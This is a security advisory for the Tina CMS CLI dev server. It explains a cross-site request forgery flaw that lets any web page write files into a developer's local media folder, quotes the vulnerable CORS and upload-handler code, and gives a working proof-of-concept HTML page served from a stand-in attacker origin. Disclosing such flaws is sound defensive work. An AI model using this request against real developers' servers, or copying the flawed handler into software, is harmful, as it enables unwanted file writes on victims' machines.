# Tina: Cross-origin `POST /media/upload/*` requests can write arbitrary files into the Tina dev server media root

- CWE: CWE-352
- Packages: npm:@tinacms/cli

---

### Summary
A browser-based cross-origin request flaw in the Tina dev server allows an attacker-controlled website to cause arbitrary file creation inside the configured media upload directory on a developer machine running `tinacms dev`. No manual file upload is required. The attacker page builds the multipart request in JavaScript and sends it directly to the local Tina server. The browser blocks access to the response because of CORS, but the server still processes the request and writes the file.

### Details
The issue is in the dev server path of `@tinacms/cli`.

The Vite dev server installs CORS middleware:

```ts
// packages/@tinacms/cli/src/next/vite/plugins.ts
server.middlewares.use(
  cors({
    origin: corsOriginCheck,
    methods: ['GET', 'HEAD', 'PUT', 'PATCH', 'POST', 'DELETE'],
  })
);
```

For disallowed origins, the origin callback only returns `false` to the CORS library:

```ts
// packages/@tinacms/cli/src/next/vite/cors.ts
return (origin, callback) => {
  ...
  callback(null, false);
};
```

That does not reject the request server-side. The same request is still routed into the upload handler:

```ts
// packages/@tinacms/cli/src/next/vite/plugins.ts
if (req.url.startsWith('/media/upload')) {
  await mediaRouter.handlePost(req, res);
  return;
}
```

The upload handler then accepts attacker-controlled path and body data and writes the file:

```ts
// packages/@tinacms/cli/src/next/commands/dev-command/server/media.ts
bb.on('file', async (_name, file, _info) => {
  const fullPath = decodeURIComponent(
    req.url?.slice('/media/upload/'.length)
  );
  const saveTo = resolveStrictlyWithinBase(fullPath, mediaFolder);
  await fs.ensureDir(path.dirname(saveTo));
  file.pipe(fs.createWriteStream(saveTo));
});
```

This is exploitable because `multipart/form-data` is a simple browser request and does not require a preflight. CORS only prevents the attacking page from reading the response; it does not stop the local Tina server from processing the state-changing request.

I validated this locally with a browser-backed repro:
- the request origin was a disallowed non-localhost origin,
- the browser treated the fetch as blocked,
- the local Tina media file was still written with attacker-controlled contents.

The demonstrated impact is limited to arbitrary file creation inside the configured Tina media root. I did not demonstrate traversal outside that directory or code execution.

### PoC
Minimal reproduction:

1. Start a Tina dev server so the media upload route is reachable at:
```text
http://127.0.0.1:<TINA_PORT>/media/upload/<filename>
```

2. From a different, non-allowed origin such as `http://evil.test:8000`, serve this page:

```html
<!doctype html>
<script>
(async () => {
  const form = new FormData();
  form.append(
    'file',
    new Blob(['poc-from-cross-origin'], { type: 'text/plain' }),
    'poc.txt'
  );

  try {
    await fetch('http://127.0.0.1:<TINA_PORT>/media/upload/poc.txt', {
      method: 'POST',
      body: form,
    });
    console.log('fetch resolved');
  } catch {
    console.log('fetch blocked by CORS');
  }
})();
</script>
```

3. Open that page in a browser while the Tina dev server is running.

4. Observe:
- the browser reports the cross-origin request as blocked or inaccessible,
- but `poc.txt` is still created in the configured media directory, commonly:
```text
public/uploads/poc.txt
```

5. Verify the file contents are:
```text
poc-from-cross-origin
```

This reproduces the vulnerability without any victim-side manual upload action.

### Impact
This is a browser-mediated arbitrary file write into the Tina dev server’s configured media root. The affected population is developers or operators running the local Tina dev server and visiting an attacker-controlled webpage. The demonstrated impact is integrity impact on local project files under the upload root. I did not demonstrate write outside the media root, GraphQL mutation CSRF, or code execution.
